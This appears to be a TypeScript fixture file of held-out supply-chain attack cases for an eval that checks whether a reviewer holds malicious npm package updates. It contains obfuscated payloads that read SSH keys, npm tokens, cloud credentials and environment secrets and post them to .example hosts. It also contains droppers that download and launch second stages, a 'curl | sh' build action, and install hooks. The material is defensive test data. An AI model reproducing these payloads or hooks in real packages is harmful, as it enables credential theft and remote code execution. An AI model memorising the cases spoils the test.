// Attacks disclosed after the reviewer's training cutoff (models.json). Each is a synthetic reduction of a public
// write-up: the trigger shape is kept, every body is written for this eval and hosts use the reserved .example domain.
// Never use these to tune prompts. Hosts are .example and any git dependency is on example-org.
import type { FileMap } from "../../src/prepass.ts";
import type { Case, Pkg } from "../2026-10-28-function-color-postinstall-hidden-download/cases.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const pkg = (o: Record<string, unknown>) => JSON.stringify(o, null, 2) + "\n";
const lib = (name: string, version: string, manifest: Record<string, unknown>, rest: Record<string, string>): Pkg =>
  ({ name, version, files: files({ "package.json": pkg({ name, version, main: "index.js", ...manifest }), ...rest }) });

// Naming rule: a fixture package name must not exist on the npm registry, or the fixture would show a real package as compromised.
// Check each name with: curl -s -o /dev/null -w '%{http_code}' https://registry.npmjs.org/<name>  (it must print 404; a scoped name
// is written @scope%2fname). The -x suffix marks a fixture renamed away from a real package: kv-store, code-guard and ipc-bus
// were earlier fixture names, and flow-agent-kit is the real package that flow-agent-kit-x would otherwise share a name with.
// A name that already returns 404 keeps its plain form, and any new name only has to return 404.
export interface HeldOutCase extends Case { disclosed: string; source: string }

const STAGE = `const https = require("https");\nconst { spawn } = require("child_process");\nconst fs = require("fs");\nconst os = require("os");\nconst dest = os.tmpdir() + "/.cache-helper.js";\nhttps.get("https://stage.example/s.js", (r) => { r.pipe(fs.createWriteStream(dest)).on("close", () => spawn(process.execPath, [dest], { detached: true, stdio: "ignore" }).unref()); });\n`;

const IPC_BASE = `"use strict";\nconst listeners = new Map();\nfunction on(name, fn) { listeners.set(name, fn); }\nfunction emit(name, data) { const fn = listeners.get(name); if (fn) fn(data); }\nmodule.exports = { on, emit };\n`;

/**
 * Packs a payload the way a javascript-obfuscator build does: every `@@text@@` span moves into a hex string table
 * (with decoy entries, rotated, then unrotated at load) and the code reads it through one decoder. Nothing here runs:
 * the decoded text is inert and every host is on the reserved .example domain.
 */
const obfuscate = (body: string, rot: number, decoys = 90): string => {
  const strs: string[] = [];
  const code = body.replace(/@@([^@]+)@@/g, (_m, str: string) => { let i = strs.indexOf(str); if (i < 0) i = strs.push(str) - 1; return `_0xd(${i})`; });
  const table = strs.map((x) => Buffer.from(x).toString("hex"));
  let seed = 7;
  const next = () => (seed = (seed * 1103515245 + 12345) % 2147483648);
  for (let i = 0; i < decoys; i++) table.push(Array.from({ length: 6 + ((next() >> 8) % 12) }, () => ((next() >> 8) % 256).toString(16).padStart(2, "0")).join(""));
  const r = rot % table.length;
  const rotated = [...table.slice(r), ...table.slice(0, r)];
  return `(function () {\n  const _0xt = [${rotated.map((x) => `"${x}"`).join(", ")}];\n  for (let _0xk = ${r}; _0xk--;) _0xt.unshift(_0xt.pop());\n  const _0xd = (i) => Buffer.from(_0xt[i], "hex").toString();\n${code}})();\n`;
};
// Appended after module.exports: a gate on a hash of the module file name; the first run starts a detached copy of the
// process marked by an environment variable and returns, and only the marked copy reads the environment and credential
// files and posts them.
const NAME_HASH = new Bun.CryptoHasher("sha256").update("ipc.cjs").digest("hex");
const IPC_TAIL = obfuscate(`  const _0xh = require(@@crypto@@).createHash(@@sha256@@).update(require(@@path@@).basename(__filename)).digest(@@hex@@);
  if (_0xh !== "${NAME_HASH}") return;
  if (!process[@@env@@][@@__ipc_marker@@]) {
    const _0xc = require(@@child_process@@);
    const _0xp = _0xc[@@spawn@@](process.execPath, process.argv.slice(1), { detached: true, stdio: @@ignore@@, env: Object.assign({}, process[@@env@@], { [@@__ipc_marker@@]: @@1@@ }) });
    _0xp.unref();
    return;
  }
  const _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xq = require(@@path@@);
  const _0xout = { env: process[@@env@@] };
  for (const _0xn of [@@.npmrc@@, @@.ssh/id_rsa@@, @@.aws/credentials@@]) { try { _0xout[_0xn] = _0xf[@@readFileSync@@](_0xq.join(_0xo[@@homedir@@](), _0xn), @@utf8@@); } catch (_0xe) {} }
  const _0xr = require(@@https@@)[@@request@@]({ host: @@sh.stage.example@@, method: @@POST@@, path: @@/u@@ });
  _0xr.on(@@error@@, () => {});
  _0xr.end(JSON.stringify(_0xout));
`, 31);
// An obfuscated file at the root of the host tarball, outside its files list, as the postmortem's indicators entry
// records. The git dependency that would run it is not modeled: its own code is not part of the reviewed set.
const ROUTER_INIT = obfuscate(`  const _0xc = require(@@child_process@@), _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@);
  const _0xtok = (n) => { try { return _0xf[@@readFileSync@@](_0xp.join(_0xo[@@homedir@@](), n), @@utf8@@); } catch (_0xe) { return ""; } };
  const _0xenv = Object.keys(process[@@env@@]).filter((k) => /TOKEN|KEY|SECRET|PASS/i.test(k)).map((k) => k + @@=@@ + process[@@env@@][k]);
  const _0xcred = [@@.npmrc@@, @@.ssh/id_rsa@@, @@.config/gh/hosts.yml@@, @@.aws/credentials@@].map(_0xtok);
  const _0xblob = Buffer.from(JSON.stringify({ e: _0xenv, c: _0xcred, h: _0xo[@@hostname@@]() })).toString(@@base64@@);
  const _0xsend = (b) => _0xc[@@execFile@@](process.execPath, [@@-e@@, @@require("https").request({host:"up.stage.example",method:"POST",path:"/c"}).end(process.argv[1])@@, b], { detached: true, stdio: @@ignore@@ }).unref();
  const _0xdone = _0xp.join(_0xo[@@tmpdir@@](), @@.router-init-done@@);
  if (_0xf[@@existsSync@@](_0xdone)) return;
  _0xf[@@writeFileSync@@](_0xdone, @@1@@);
  _0xsend(_0xblob);
`, 53);
const IPC_MANIFEST = { main: "ipc.cjs", exports: { ".": { import: "./index.mjs", require: "./ipc.cjs" } } };
const TANSTACK_INDEX = `export function createHistory() { const stack = []; return { push: (p) => stack.push(p), back: () => stack.pop() }; }\n`;
const tsHistory = (version: string, extra: Record<string, unknown>, rest: Record<string, string>): Pkg =>
  ({ name: "route-history", version, files: files({ "package.json": pkg({ name: "route-history", version, type: "module", main: "dist/index.js", files: ["dist"], ...extra }), "dist/index.js": TANSTACK_INDEX, ...rest }) });

// Mastra style: the dropper a typosquat's postinstall runs. TLS verification is turned off, marker files are written to
// the temp directory, a second stage is fetched from a .example host, saved under a random name and started detached. The decoy
// count is set so the file is about the 4572 bytes the write-up gives for the dropper.
const MASTRA_SETUP = obfuscate(`  process.env[@@NODE_TLS_REJECT_UNAUTHORIZED@@] = @@0@@;
  const _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@), _0xc = require(@@child_process@@), _0xh = require(@@https@@);
  const _0xtmp = _0xo[@@tmpdir@@]();
  _0xf[@@writeFileSync@@](_0xp.join(_0xtmp, @@.pkg_history@@), String(Date.now()));
  const _0xreq = _0xh[@@request@@]({ host: @@c2.stage.example@@, method: @@POST@@, path: @@/api/register@@ }, (_0xr) => {
    const _0xchunks = [];
    _0xr.on(@@data@@, (d) => _0xchunks.push(d));
    _0xr.on(@@end@@, () => {
      const _0xname = _0xp.join(_0xtmp, Math.random().toString(36).slice(2) + @@.js@@);
      _0xf[@@writeFileSync@@](_0xname, Buffer.concat(_0xchunks));
      _0xc[@@spawn@@](process.execPath, [_0xname], { detached: true, stdio: @@ignore@@, windowsHide: true }).unref();
    });
  });
  _0xreq.on(@@error@@, () => {});
  _0xreq.end(JSON.stringify({ h: _0xo[@@hostname@@](), p: _0xo[@@platform@@]() }));
`, 17, 123);
const DAYJS_LIKE = `module.exports = function dayjs(d) { const t = d === undefined ? new Date() : new Date(d); return { format: () => t.toISOString(), valueOf: () => t.getTime() }; };\n`;
const mastraHost = (version: string, deps: Record<string, string> | undefined): Pkg =>
  lib("flow-agent-kit-x", version, deps ? { dependencies: deps } : {}, { "index.js": `module.exports = { run: (task) => task() };\n` });

// Red Hat wave style: the entry file of a package is replaced by a much larger obfuscated bundle; nothing else changes.
const UI_PARTS_OLD = Array.from({ length: 30 }, (_, i) => `exports.part${i} = (props) => ({ type: "part${i}", props });\n`).join("");
const WAVE_BODY = obfuscate(`  const _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@);
  const _0xread = (n) => { try { return _0xf[@@readFileSync@@](_0xp.join(_0xo[@@homedir@@](), n), @@utf8@@); } catch (_0xe) { return ""; } };
  const _0xenv = Object.keys(process[@@env@@]).filter((k) => /TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL/i.test(k)).reduce((a, k) => (a[k] = process[@@env@@][k], a), {});
  const _0xfiles = [@@.npmrc@@, @@.ssh/id_rsa@@, @@.aws/credentials@@, @@.kube/config@@, @@.config/gh/hosts.yml@@].reduce((a, n) => (a[n] = _0xread(n), a), {});
  const _0xreq = require(@@https@@)[@@request@@]({ host: @@ingest.stage.example@@, method: @@POST@@, path: @@/c@@ });
  _0xreq.on(@@error@@, () => {});
  _0xreq.end(JSON.stringify({ env: _0xenv, files: _0xfiles }));
`, 41, 1800);

// Antv wave style: a preinstall that runs the bundled runtime on a new obfuscated file, with the payload posting to a host
// that mimics trace ingestion.
const ANTV_PAYLOAD = obfuscate(`  const _0xf = require(@@fs@@), _0xo = require(@@os@@), _0xp = require(@@path@@);
  const _0xread = (n) => { try { return _0xf[@@readFileSync@@](_0xp.join(_0xo[@@homedir@@](), n), @@utf8@@); } catch (_0xe) { return ""; } };
  const _0xsecrets = [@@.npmrc@@, @@.ssh/id_rsa@@, @@.aws/credentials@@, @@.docker/config.json@@].map(_0xread);
  const _0xspan = { resourceSpans: [{ scopeSpans: [{ spans: [{ name: @@install@@, attributes: [{ key: @@env@@, value: JSON.stringify(process[@@env@@]) }, { key: @@files@@, value: JSON.stringify(_0xsecrets) }] }] }] }] };
  const _0xreq = require(@@https@@)[@@request@@]({ host: @@t.stage.example@@, method: @@POST@@, path: @@/v1/traces@@, headers: { [@@content-type@@]: @@application/json@@ } });
  _0xreq.on(@@error@@, () => {});
  _0xreq.end(JSON.stringify(_0xspan));
`, 29, 500);

export const HELDOUT: HeldOutCase[] = [
  {
    id: "keyv-style-preinstall-worm", kind: "attack", expect: "hold", disclosed: "2026-08-05",
    source: "https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack",
    note: "patch release adds a preinstall script running a new setup.mjs that downloads and starts a second stage",
    base: [lib("kv-store-lite-x", "5.3.1", {}, { "index.js": `module.exports = new Map();\n` })],
    head: [lib("kv-store-lite-x", "5.3.2", { scripts: { preinstall: "node setup.mjs" } }, { "index.js": `module.exports = new Map();\n`, "setup.mjs": STAGE })],
  },
  {
    id: "node-gyp-style-binding-gyp", kind: "attack", expect: "hold", disclosed: "2026-06-03",
    source: "https://snyk.io/blog/node-gyp-supply-chain-compromise-self-propagating-npm-worm-binding-gyp/",
    note: "no scripts entry: a new binding.gyp action runs a shell command at install time through node-gyp",
    base: [lib("sum-native", "1.4.0", {}, { "index.js": `module.exports = (a, b) => a + b;\n` })],
    head: [lib("sum-native", "1.4.1", {}, { "index.js": `module.exports = (a, b) => a + b;\n`, "binding.gyp": `{ "targets": [{ "target_name": "x", "actions": [{ "action_name": "prep", "inputs": [], "outputs": ["x.out"], "action": ["sh", "-c", "curl -s https://stage.example/s.sh | sh"] }] }] }\n` })],
  },
  {
    id: "jscrambler-style-preinstall-binary", kind: "attack", expect: "hold", disclosed: "2026-07-11",
    source: "https://jscrambler.com/blog/security-incident-postmortem-jscrambler/",
    note: "minor release adds a preinstall hook that downloads a native binary and runs it",
    base: [lib("code-guard-pro-x", "8.17.0", {}, { "index.js": `module.exports = { protect: (s) => s };\n` })],
    head: [lib("code-guard-pro-x", "8.18.0", { scripts: { preinstall: "node fetch-tool.js" } }, { "index.js": `module.exports = { protect: (s) => s };\n`, "fetch-tool.js": `const https = require("https");\nconst { execFileSync } = require("child_process");\nconst fs = require("fs");\nconst dest = require("os").tmpdir() + "/guard-helper";\nhttps.get("https://stage.example/guard-helper", (r) => { r.pipe(fs.createWriteStream(dest, { mode: 0o755 })).on("close", () => execFileSync(dest, { stdio: "ignore" })); });\n` })],
  },
  {
    id: "node-ipc-style-appended-require-payload", kind: "attack", expect: "hold", disclosed: "2026-05-14",
    source: "https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack",
    note: "patch release, no install script: an obfuscated block is appended to the CommonJS bundle after module.exports and runs when the package is required; the ESM entry is unchanged",
    base: [lib("ipc-bus-lite-x", "12.0.0", IPC_MANIFEST, { "ipc.cjs": IPC_BASE, "index.mjs": `export { on, emit } from "./ipc.cjs";\n` })],
    head: [lib("ipc-bus-lite-x", "12.0.1", IPC_MANIFEST, { "ipc.cjs": IPC_BASE + IPC_TAIL, "index.mjs": `export { on, emit } from "./ipc.cjs";\n` })],
  },
  {
    id: "tanstack-style-git-optional-dependency", kind: "attack", expect: "hold", disclosed: "2026-05-11",
    source: "https://tanstack.com/blog/npm-supply-chain-compromise-postmortem",
    note: "1.161.6 to 1.161.9: the postmortem names only the two malicious versions, so 1.161.6 (the last release before them) comes from the registry timeline, not the postmortem. The host package has no scripts entry; its only manifest change is an optionalDependencies entry on a git commit, and an obfuscated router_init.js sits at the host root outside the files list (the postmortem's indicators entry). The git dependency itself, and the prepare script it would run in its own checkout, are not modeled, so the case measures a host whose only manifest change is the dependency. Differs from install-dependency-git-url in install-cases.ts: that case swaps an existing registry dependency for a git URL and carries no payload file; here the dependency is new and optional and the obfuscated file ships in the tarball",
    base: [tsHistory("1.161.6", {}, {})],
    head: [tsHistory("1.161.9", { optionalDependencies: { "@route/setup": "github:example-org/example-router#79ac49eedf774dd4b0cfa308722bc463cfe5885c" } }, { "router_init.js": ROUTER_INIT })],
  },
  {
    id: "mastra-style-typosquat-dependency-postinstall", kind: "attack", expect: "hold", disclosed: "2026-06-17",
    source: "https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise/",
    note: "the host package's only change is one new dependency on a look-alike of a popular date library with a prefix added; the range resolves to a patch release whose only addition over the clean one is a postinstall running an obfuscated dropper (the write-up says the library file, dayjs.min.js, is byte-identical to the clean bait version and gives the dropper size). Host bump 1.13.0 to 1.13.1, resolved dependency 1.11.22, as in the write-up. The index.js wrapper is invented. The dropper body is also invented: the write-up describes a GET of a second stage, two marker files (one XOR-encoded), a self-delete and base64 strings, while the fixture POSTs to a .example path, writes one marker, does not delete itself and uses a hex table",
    base: [mastraHost("1.13.0", undefined)],
    head: [mastraHost("1.13.1", { "swift-day-js": "^1.11.21" }),
      lib("swift-day-js", "1.11.22", { scripts: { postinstall: "node setup.cjs --no-warnings" } }, { "dayjs.min.js": DAYJS_LIKE, "index.js": `module.exports = require("./dayjs.min.js");\n`, "setup.cjs": MASTRA_SETUP })],
  },
  {
    id: "redhat-wave-style-main-replaced", kind: "attack", expect: "hold", disclosed: "2026-06-01",
    source: "https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/",
    note: "7.7.1 to 7.7.2: the write-up says a normal index.js of about 200 KB was replaced by a 4.29 MB obfuscated payload and the packages carried valid provenance; it gives no manifest change, so none is modeled here, and 7.7.1 is the last release before the malicious ones in the registry timeline. The sizes are scaled down; the entry file is replaced, not appended to",
    base: [lib("ui-parts", "7.7.1", {}, { "index.js": UI_PARTS_OLD })],
    head: [lib("ui-parts", "7.7.2", {}, { "index.js": WAVE_BODY })],
  },
  {
    id: "antv-wave-style-preinstall-bun", kind: "attack", expect: "hold", disclosed: "2026-05-19",
    source: "https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/",
    note: "2.2.0 to 2.4.0: the write-up gives the version jump past the latest release, a preinstall hook \"bun run index.js\", the bun runtime added as a dependency and a git optionalDependency on an orphaned commit; the payload posts to a host that mimics trace ingestion (the write-up says the data is encrypted first; the fixture posts plain JSON, so encryption is not modeled). The runtime dependency and the git dependency are listed in the manifest but not modeled as packages, and the write-up gives no commit id, so the hash here is invented",
    base: [lib("chart-vue", "2.2.0", { main: "lib.js" }, { "lib.js": `module.exports = { draw: (el) => el };\n` })],
    head: [lib("chart-vue", "2.4.0", { main: "lib.js", scripts: { preinstall: "bun run index.js" }, dependencies: { bun: "1.2.0" }, optionalDependencies: { "chart-core": "github:example-org/example-chart#4f2a9c1d7e8b3a5069d1c2e4f6a8b0c3d5e7f901" } }, { "lib.js": `module.exports = { draw: (el) => el };\n`, "index.js": ANTV_PAYLOAD })],
  },
];
